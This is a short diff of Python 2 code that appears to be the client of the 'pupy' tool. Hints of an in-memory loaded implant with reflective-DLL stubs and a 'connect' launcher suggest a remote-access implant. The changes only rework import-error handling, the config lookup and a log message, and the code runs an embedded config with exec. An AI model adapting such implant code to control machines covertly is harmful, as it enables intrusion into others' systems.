@@ -77,19 +77,20 @@ logging.getLogger().setLevel(logging.WARNING)
 
 try:
     import pupy
-except ImportError:
-    pass
+except ImportError, e:
+    print 'Couldnt load pupy: {}'.format(e)
+    import traceback
+    traceback.print_stack()
 
-if 'pupy' not in sys.modules:
-    if not 'pupy' in sys.modules:
-        mod = imp.new_module("pupy")
-        mod.__name__ = "pupy"
-        mod.__file__ = "<memimport>\\\\pupy"
-        mod.__package__ = "pupy"
-        sys.modules["pupy"] = mod
-        mod.pseudo = True
+    mod = imp.new_module("pupy")
+    mod.__name__ = "pupy"
+    mod.__file__ = "<memimport>\\\\pupy"
+    mod.__package__ = "pupy"
+    sys.modules["pupy"] = mod
+    mod.pseudo = True
 
-import pupy
+    import pupy
+
 pupy.infos = {}  # global dictionary to store informations persistent through a deconnection
 
 LAUNCHER = "connect"  # the default launcher to start when no argv
@@ -254,14 +255,13 @@ def main():
     if LAUNCHER not in conf.launchers:
         exit("No such launcher: %s" % LAUNCHER)
 
-    if 'get_pupy_config' in pupy.__dict__:
+    if hasattr(pupy, 'get_pupy_config'):
         try:
             config_file = pupy.get_pupy_config()
             exec config_file in globals()
-        except ImportError:
+        except ImportError, e:
             logging.warning(
-                "ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL")
-
+                "ImportError: Couldn't load pupy config: {}".format(e))
 
     launcher = conf.launchers[LAUNCHER]()
     try:
